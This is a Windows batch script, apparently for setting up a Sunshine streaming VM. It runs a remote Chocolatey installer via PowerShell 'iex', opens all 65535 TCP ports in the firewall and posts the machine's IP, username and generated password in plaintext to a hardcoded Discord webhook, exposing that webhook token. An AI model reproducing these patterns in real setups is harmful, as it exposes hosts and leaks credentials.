@echo off
REM Sunshine Configuration Script: Combined Actions
REM This script combines actions from sunshine_config_openport_allow_all.bat, sunshine_setup_webhook_messages.bat, and test8.bat



echo Webhook setup completed.

REM Section 1: Test 8 Actions

echo Executing test actions...
REM Content from test8.bat
@echo off
:: Définir les variables utiles
set "INSTALL_PATH=C:\vdd"
set "VDD_ZIP_PATH=%INSTALL_PATH%\vdd.zip"
set "VDD_EXTRACT_PATH=%INSTALL_PATH%\VDD.23.10.20.2\IddSampleDriver"
set "TARGET_PATH=C:\IddSampleDriver"
set "CHOCOLATEY_INSTALL_SCRIPT=https://community.chocolatey.org/install.ps1"
set "VDD_DOWNLOAD_URL=https://github.com/themimi974/Virtual-Display-Driver/releases/download/v1.0.1/VDD.23.10.20.3.zip"
set "SRM_DOWNLOAD_PATH=https://github.com/themimi974/Qres_GUI/archive/refs/heads/main.zip"
set "SRM_ZIP_PATH=C:\srm.zip"

:: Fonction de téléchargement du script d'installation Chocolatey et son exécution
echo Installing Chocolatey...
powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command ^
    "[System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString('%CHOCOLATEY_INSTALL_SCRIPT%'))"

:: Vérifier si Chocolatey est installé correctement
if %errorlevel% neq 0 (
    echo [ERREUR] L'installation de Chocolatey a échoué.
    pause
    exit /b 1
)

:: Ajouter Chocolatey au PATH
SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"

:: Installer les packages nécessaires via Chocolatey
echo Installing necessary packages via Chocolatey...
choco install sunshine python3 7zip devcon.portable vb-cable -y

:: Vérifier si l'installation des packages a réussi
if %errorlevel% neq 0 (
    echo [ERREUR] L'installation des packages Chocolatey a échoué.
    pause
    exit /b 1
)

:: Créer le dossier d'installation pour VDD
if not exist "%INSTALL_PATH%" (
    mkdir "%INSTALL_PATH%"
)

:: Télécharger le fichier VDD.zip
echo Downloading VDD...
powershell -Command "Invoke-WebRequest %VDD_DOWNLOAD_URL% -OutFile %VDD_ZIP_PATH%"

:: Vérifier si le téléchargement a réussi
if not exist "%VDD_ZIP_PATH%" (
    echo [ERREUR] Le téléchargement de VDD a échoué.
    pause
    exit /b 1
)

:: Extraire le fichier VDD.zip
echo Extracting VDD.zip...
7z x "%VDD_ZIP_PATH%" -o"%INSTALL_PATH%"

:: Vérifier si l'extraction a réussi
if not exist "%VDD_EXTRACT_PATH%" (
    echo [ERREUR] L'extraction de VDD a échoué.
    pause
    exit /b 1
)

:: Copier option.txt à l'emplacement correct
if not exist "%TARGET_PATH%" (
    mkdir "%TARGET_PATH%"
)
copy "%VDD_EXTRACT_PATH%\option.txt" "%TARGET_PATH%\option.txt"

:: Vérifier si option.txt est bien copié
if exist "%TARGET_PATH%\option.txt" (
    echo option.txt a été copié avec succès.
) else (
    echo [ERREUR] option.txt n'a pas été copié. Installation annulée.
    pause
    exit /b 1
)

:: Installer le driver de l'écran virtuel
echo Press Enter to install virtual screen...
call "%VDD_EXTRACT_PATH%\installCert.bat"
devcon64 install "%VDD_EXTRACT_PATH%\iddsampledriver.inf" root\iddsampledriver

:: Vérifier si l'installation du driver a réussi
if %errorlevel% neq 0 (
    echo [ERREUR] L'installation du driver de l'écran virtuel a échoué.
    pause
    exit /b 1
)

:: Télécharger et installer le micrologiciel de gestion de résolution
echo Downloading and installing screen resolution manager...
powershell -Command "Invoke-WebRequest %SRM_DOWNLOAD_PATH% -OutFile %SRM_ZIP_PATH%"
7z x "%SRM_ZIP_PATH%" -oC:\

:: Vérifier si le téléchargement et l'extraction de SRM ont réussi
if not exist "C:\Qres_GUI-main" (
    echo [ERREUR] Le téléchargement ou l'extraction du micrologiciel de gestion de résolution a échoué.
    pause
    exit /b 1
)

:: Créer le script de démarrage pour le gestionnaire de résolution d'écran
set "STARTUP_SCRIPT=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\StartScreenResManager.bat"
(
    echo @echo off
    echo pip install tk
    echo pip install screeninfo
    echo pip install pystray
    echo cd C:\Qres_GUI-main
    echo python C:\Qres_GUI-main\shortcut.py
) > "%STARTUP_SCRIPT%"

:: Vérifier si le script de démarrage a été créé avec succès
if exist "%STARTUP_SCRIPT%" (
    echo Le script de démarrage a été créé avec succès.
) else (
    echo [ERREUR] Le script de démarrage n'a pas été créé. Installation annulée.
    pause
    exit /b 1
)

:: Suppression des fichiers et dossiers temporaires
echo Cleaning up temporary files...
rd /s /q "%INSTALL_PATH%"
rd /s /q "%VDD_EXTRACT_PATH%"
del /q "%SRM_ZIP_PATH%"

REM Section 2: Configuration to Allow All Ports

echo Configuring Sunshine to allow all ports...
REM Content from sunshine_config_openport_allow_all.bat
netsh advfirewall firewall add rule name="Open All Ports" dir=in action=allow protocol=TCP localport=1-65535
netsh advfirewall firewall add rule name="Open All Ports" dir=out action=allow protocol=TCP localport=1-65535

echo Ports configuration completed.

REM Section 3: Setting up Webhook Messages

setlocal enabledelayedexpansion

:: 1. Récupérer le nom de l'ordinateur
set "COMPUTER_NAME=%COMPUTERNAME%"

:: 2. Récupérer l'adresse IPv4
for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr "IPv4"') do set "IP_ADDRESS=%%A"
set "IP_ADDRESS=%IP_ADDRESS: =%"  :: Enlever les espaces

:: Si aucune adresse IPv4 n'est trouvée, essayer d'obtenir l'IPv6
if not defined IP_ADDRESS (
    for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr "IPv6"') do set "IP_ADDRESS=%%A"
    set "IP_ADDRESS=%IP_ADDRESS: =%"  :: Enlever les espaces
)

:: 3. Ouvrir le port 47990 dans le pare-feu
netsh advfirewall firewall add rule name="Ouvrir Port 47990" dir=in action=allow protocol=TCP localport=47990

:: 4. Générer un mot de passe robuste aléatoire
set "PASSWORD="
set "CHARSET=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "LENGTH=15"

:: Boucle pour générer le mot de passe
for /L %%i in (1,1,%LENGTH%) do (
    set /a "RANDOM_INDEX=!RANDOM! %% 62"
    for %%j in (!RANDOM_INDEX!) do (
        set "PASSWORD=!PASSWORD!!CHARSET:~%%j,1!"
    )
)

:: 5. Définit les identifiants de Sunshine
set "USERNAME=Sunshine"
set "USER_PASSWORD=%PASSWORD%"

:: 6. Préparer le message à envoyer au webhook Discord
set "WEBHOOK_URL=https://discord.com/api/webhooks/1294633030635360339/RYnF8JJBXCgUfkpQwBSZ3CdSs6fdHOiq7qH1Q9mg73qL4D4oV23nlYbqs55TE3-EDgSE"
set "MESSAGE={\"content\":\"Nom de la VM : %COMPUTER_NAME%, Adresse IP : %IP_ADDRESS%, Identifiant : %USERNAME%, Mot de passe : %USER_PASSWORD%\"}"

:: 7. Envoyer le message au webhook Discord
powershell -Command "Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method POST -ContentType 'application/json' -Body '%MESSAGE%'"

:: 8. Lancer Sunshine avec les identifiants définis
"C:\Program Files\Sunshine\sunshine.exe" --creds %USERNAME% %USER_PASSWORD%

:: Fin du script
endlocal

REM End of Combined Script
echo All actions have been executed. Exiting...
@pause
